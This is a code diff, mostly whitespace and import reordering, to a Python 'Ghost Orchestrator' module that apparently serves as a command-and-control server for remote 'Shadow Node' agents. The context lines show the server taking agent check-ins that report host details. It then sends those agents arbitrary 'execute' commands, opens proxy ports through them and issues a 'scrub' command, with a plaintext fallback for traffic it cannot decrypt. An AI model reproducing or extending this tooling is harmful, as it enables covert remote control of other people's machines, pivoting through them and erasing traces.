@@ -3,19 +3,21 @@ ShadowCypher Ghost Orchestrator — Manages remote 'Shadow Nodes' (Ghost Agents)
 Provides secure command delegation and asynchronous result aggregation.
 """
 
+import base64
+import json
+import os
 import socket
+import ssl
 import subprocess
 import threading
-import json
 import time
-import base64
-import ssl
-import os
-from typing import Dict, List, Optional
+from typing import List, Optional
+
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-from shadowcypher.core.logger import logger
+
 from shadowcypher.core.bus import bus
 from shadowcypher.core.config import config
+from shadowcypher.core.logger import logger
 
 _MASTER_KEY_PATHS = (
     "/etc/shadowcypher/master.key",
@@ -210,13 +212,13 @@ class GhostOrchestrator:
             data = conn.recv(4096).decode()
             if not data:
                 return
-            
+
             # Attempt to decrypt
             decrypted = decrypt(data.strip())
             if not decrypted:
                 # Fallback to plaintext for migration/test
                 decrypted = data
-                
+
             packet = json.loads(decrypted)
             if packet.get("type") != "ghost_checkin":
                 conn.close()
@@ -226,11 +228,11 @@ class GhostOrchestrator:
             fp = packet.get("fp")
             os_info = packet.get("os")
             host = packet.get("host")
-            
+
             node_id = fp
             node = ShadowNode(nick, fp, os_info, host, conn)
             self.nodes[node_id] = node
-            
+
             logger.info("ghost", f"SHADOW_NODE_LINKED: {nick} ({addr[0]}) [{os_info}]")
             bus.publish("ghost_node_linked", {"nick": nick, "fp": fp, "host": addr[0]})
 
@@ -240,7 +242,7 @@ class GhostOrchestrator:
                 resp_data = conn.recv(16384).decode()
                 if not resp_data:
                     break
-                
+
                 # Handle possible multiple JSON objects in one buffer (newline delimited)
                 for line in resp_data.split('\n'):
                     if not line.strip():
@@ -253,7 +255,7 @@ class GhostOrchestrator:
                             resp_packet = json.loads(decrypted)
                         else:
                             resp_packet = json.loads(line)
-                            
+
                         if resp_packet.get("type") == "ghost_output":
                             bus.publish("ghost_node_output", {
                                 "fp": fp,
@@ -263,7 +265,7 @@ class GhostOrchestrator:
                     except Exception:
                         continue
                 node.last_seen = time.time()
-                
+
         except Exception as e:
             if node_id and node_id in self.nodes:
                 logger.warn("ghost", f"SHADOW_NODE_DROPPED: {self.nodes[node_id].nick} ({e})")
@@ -279,7 +281,7 @@ class GhostOrchestrator:
         node = self.nodes.get(node_fp)
         if not node or not node.is_active:
             return False
-        
+
         payload = {
             "type": "execute",
             "cmd": command
@@ -297,7 +299,7 @@ class GhostOrchestrator:
         node = self.nodes.get(node_fp)
         if not node or not node.is_active:
             return False
-        
+
         payload = {
             "type": "proxy",
             "port": port
@@ -314,7 +316,7 @@ class GhostOrchestrator:
         node = self.nodes.get(node_fp)
         if not node or not node.is_active:
             return False
-        
+
         payload = {
             "type": "scrub"
         }
